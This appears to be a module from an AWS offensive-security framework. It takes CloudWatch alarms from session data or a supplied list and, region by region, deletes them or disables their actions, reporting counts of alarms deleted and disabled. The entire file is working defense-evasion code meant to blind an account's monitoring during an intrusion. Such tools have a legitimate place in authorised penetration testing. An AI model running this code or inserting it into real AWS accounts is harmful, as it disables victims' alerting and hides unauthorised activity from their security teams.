#!/usr/bin/env python3
import datetime

import argparse
from copy import deepcopy


def main(args, awsattack_main, data=None):
    technique_info = data
    session = awsattack_main.get_active_session()
    
    print = awsattack_main.print
    fetch_data = awsattack_main.fetch_data
    get_regions = awsattack_main.get_regions

    cw_regions = get_regions('monitoring')

    alarms = []

    summary_data = {}

    if args.alarms is not None:
        cw_regions = set()
        for alarm in args.alarms.split(','):
            name, region = alarm.split('@')
            alarms.append({
                'AlarmName': name,
                'Region': region
            })
            cw_regions.add(region)

    else:
        cloudwatch_data = deepcopy(session.CloudWatch)

        if 'Alarms' not in cloudwatch_data:
            if fetch_data(['Logging/Monitoring Data'], technique_info['prerequisite_modules'][0], None) is False:
                print('Pre-req module not run successfully. Only targeting services that currently have valid data...\n')
            else:
                alarms = deepcopy(session.CloudWatch['Alarms'])
        else:
            alarms = cloudwatch_data['Alarms']

    if len(alarms) > 0:
        print('Starting CloudWatch alarms...\n')
        summary_data['cloudwatch'] = {
            'deleted': 0,
            'disabled': 0,
        }
        for region in cw_regions:
            print('  Starting region {}...\n'.format(region))

            client = awsattack_main.get_boto3_client('cloudwatch', region)

            for alarm in alarms:
                if alarm['Region'] == region:
                    action = args.action
                    if action == 'del':
                        try:
                            # delete_alarms can take multiple alarm names in one request,
                            # but if there are ANY errors, no alarms are deleted, so I
                            # chose to do one at a time here
                            client.delete_alarms(
                                AlarmNames=[
                                    alarm['AlarmName']
                                ]
                            )
                            print('        Successfully deleted alarm {}!\n'.format(alarm['AlarmName']))
                            summary_data['cloudwatch']['deleted'] += 1
                        except Exception as error:
                            print('        Could not delete alarm {}:\n          {}\n'.format(alarm['AlarmName'], error))
                    elif action == 'dis':
                        try:
                            client.disable_alarm_actions(
                                AlarmNames=[
                                    alarm['AlarmName']
                                ]
                            )
                            print('        Successfully disabled actions for alarm {}!\n'.format(alarm['AlarmName']))
                            summary_data['cloudwatch']['disabled'] += 1
                        except Exception as error:
                            print('        Could not disable actions for alarm {}:\n          {}\n'.format(alarm['AlarmName'], error))
                    else:
                        print('        Skipping alarm {}...\n'.format(alarm['AlarmName']))
        print('CloudWatch alarms finished.\n')
    else:
        print('No alarms found. Skipping CloudWatch...\n')

    return summary_data

